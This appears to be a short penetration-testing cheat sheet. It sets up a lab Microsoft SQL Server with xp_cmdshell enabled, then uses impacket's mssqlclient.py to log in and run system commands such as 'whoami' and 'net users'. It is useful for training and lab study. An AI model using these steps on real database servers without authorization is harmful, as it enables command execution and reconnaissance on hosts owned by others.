# mssqlclient.py
```
Description: Connect to a Microsoft SQL Server w/ mssqlclient.py

Setting Up Microsoft SQL Server (Windows)
    DL SQL Server Express (free version): https://www.microsoft.com/en-us/sql-server/sql-server-downloads
    Install SQL Server and SQL Server Management Studio (SSMS) for GUI management
    Choose "Mixed Mode Authentication" (SQL Server + Windows Auth)
    Set a strong password (P@ssw0rd123)

Open SQL Server Configuration Manager
    SQL Server Network Configuration → Protocols for MSSQLSERVER → Enable TCP/IP
    Allow inbound firewall rule on port 1433 (default MSSQL port)
    Restart SQL Server Service to apply changes

From SSMS or sqlcmd
    # Enable advanced options and xp_cmdshell
    EXEC sp_configure 'show advanced options', 1;
    RECONFIGURE;

    EXEC sp_configure 'xp_cmdshell', 1;
    RECONFIGURE;
```

# Client Side
```
# Install impacket with pip (in virtualenv or system)       # or clone and install from source
pip install impacket                                        git clone https://github.com/SecureAuthCorp/impacket
                                                            cd impacket
                                                            python3 setup.py install

# Use mssqlclient.py to Connect & Exploit
# Login with SQL Auth, Connect with SQL username/password   # Login with Windows Auth (if SQL Auth fails)
mssqlclient.py USERNAME@10.10.10.125                        mssqlclient.py administrator@10.10.10.125 -windows-auth

# Enable xp_cmdshell (if not already enabled)
SQL> enable_xp_cmdshell

# Run system commands
SQL> xp_cmdshell whoami
SQL> xp_cmdshell net users
SQL> xp_cmdshell ipconfig
```

## Back to README.md
[BACK](../README.md)